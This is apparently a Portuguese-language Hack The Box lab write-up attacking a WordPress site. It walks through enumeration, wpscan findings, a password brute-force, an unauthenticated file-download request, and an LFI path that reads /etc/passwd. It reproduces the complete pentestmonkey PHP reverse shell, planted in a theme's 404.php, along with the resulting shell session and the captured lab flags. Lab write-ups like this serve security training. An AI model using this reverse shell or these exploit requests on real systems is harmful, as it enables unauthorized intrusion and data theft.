## Tags
#Hackthebox 

## Alvo
- InlaneFreight

## Objetivo
-  Identifique o número da versão do WordPress. -> 5.1.6
- Identifique o tema Wordpress em uso -> twentynineteen
- Envie o conteúdo do arquivo de bandeira no diretório com a listagem de diretórios ativada.->HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
- Identifique o único usuário não administrador do WordPress. -> Charlie Wiggins
- Use um plugin vulnerável para baixar um arquivo contendo um valor de bandeira através de um download de arquivo não autenticado. -> HTB{unauTh_d0wn10ad!}
- Qual é o número de versão do plugin vulnerável a um LFI? -> 1.1.1
- Use o LFI para identificar um usuário do sistema cujo nome começa com a letra "f". -> frank.mclane
- Obtenha um shell no sistema e envie o conteúdo da bandeira no diretório /home/erika. -> HTB{w0rdPr355_4SS3ssm3n7}

## Ferramentas e scripts utilizados
- wpscan
- nmap

## Resultados obtidos
```
sudo nmap -sS 10.129.185.96                          
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-31 14:53 -0400
Nmap scan report for 10.129.2.37
Host is up (0.40s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```
Vemos aqui o servidor do wordpress rodando provavelmente na 80 ou nas duas.

```
sudo nmap -sV -sC -p 80,443 10.129.185.96
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-31 14:57 -0400
Nmap scan report for 10.129.2.37
Host is up (0.29s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Inlane Freight
443/tcp open  http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Inlane Freight
Service Info: Host: 127.0.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.81 seconds
```
Mesmo com o -sC o nmap não conseguiu pegar os banners sobre as aplicações serem wordpress , vamos agora explorar manualmente e depois via wpscan.

Pelo visto a aplicação roda somente na porta 80 tcp.

--- 
 Olhando a página inicial da aplicação não conseguimos pelo page source e inspect achar nada de legal , mas a sala nos da uma observação que não temos a porta 53 rodando para resolve DNS e que deveriamos saber como resolver dns do jeito do linux , que é pelo /etc/hosts nisso eu vi um email na pagina inicial que era info@inlanefreight.local na  qual era info@domain e nisso coloquei o domain no etc hosts junto do ip .
 Com isso como não tem DNS pensei que poderia ter vhosts em nível da aplicação web e nisso usei o gobuster.
```
gobuster vhost -u http://inlanefreight.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --no-error --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://inlanefreight.local
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
blog.inlanefreight.local Status: 200 [Size: 29308]
gc._msdcs.inlanefreight.local Status: 400 [Size: 311]
```

Com isso agora temos acesso ao blog que nele fala que é diretamente um wordpress . 

Vasculhando o page source encontrei a versão do wordpress , 5.1.6 . 

Na pagina fonte tinha o tema também twentynineteen .

Em seguida pedia para verificar uma flag dentro de um diretorio que estava com a listagem ativa , olhando na pagina fonte da pagina inicial tinha vários diretórios mas o wp-content/uploads foi o que havia , tive de vistoriar todos. 

--- 

Depois disso me pediram para ver um usuário que não era admin e nisso achei nos blogs o user erika , e fiz brute force no password dela , com isso entrei no wp-login mas não dava certo o first name e last name dela , então tem uma opção no painel do wp de all user , nisso achei o Charlie Wiggins.Mas isso foi porque a erika era admin e pedia o não admin.

---

Com o wpscan eu consegui responder a questão 6 que pedia a versão do plugin que tinha LFI como vulnerabilidade.
```
 [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     UUID: 4432ecea-2b01-4d5c-9557-352042a57e44
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2

```

--- 

Pediu para ver o plugin que tinha o dowload de arquivos de forma não autenticada e nisso o wpscan não achou e ainda não tenho na cabeça o costume ainda de saber o que fazer , como o wpscan citou outros plugins com outras coisas imaginei que ele tinha achado as vulnerabilidades todas para cada um e assim tava entre elas . Porém não estava e tive de olhar na internet e era o plugin email subscriber que olhei no exploit db e versão batia com a instalada na aplicação e nele mostrava o curl que eu tinha de fazer e achei essa flag HTB{unauTh_d0wn10ad!} .
```txt
curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'
```

---

Após isso procurei o site editor no exploit db e apareceu como exatamente eu tinha de executar o exploit 
```txt
/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
Com isso eu consegui achar o usuário com nome que começa com f. frank.mclane

--- 

Por último foi pedido que obtivessemos um shell no servidor de destino do wordpress , como temos acesso a conta da erika com senha 010203 eu utilizei o método do 404.php de algum tema , nisso editei esse arquivo no tem twentyseventeen e coloquei o seguinte código
```

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = 'ip';  // You have changed this
  $port = 4444;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
  
```
Basicamente quando executamos a url http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php ele executa esse código e nos devolve um shell mas eu tenho de estar escutando nessa porta , nisso usei o módulo multi_handler do metasploit e escutei , nisso ganhei shell e peguei a flag.
```
msf exploit(multi/handler) > exploit
[-] Handler failed to bind to 10.17.17.37:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Command shell session 2 opened (10.10.17.37:4444 -> 10.129.2.37:51554) at 2026-08-31 17:38:51 -0400


Shell Banner:
Linux nix01 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
-----
          
$ cd home
$ cd erika
$ cat d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
HTB{w0rdPr355_4SS3ssm3n7}

```
## Considerações
Lições aprendidas 
- Se o servidor não tem uma porta 53 rodando para resolver DNS temos de ser atentos aos detalhes , nessa aplicação a primeira página não era nosso real alvo mas ao olhar o domínio do email conseguimos um domain e podemos utilizar o gobuster para enumerar vhosts já que era em nível de aplicação e não DNS . 
- Usar ferramentas automatizadas mas também procurar por exploits manualmente pela versão no exploitdb ou em outros lugares
- Buscar com cautela em diretórios , fazer enumeração de dir em wp-content e wp-includes sempre procurando diretórios indexáveis.
- Lembrar do 404.php que pode nos gerar shell reverso e muitas outras opções.

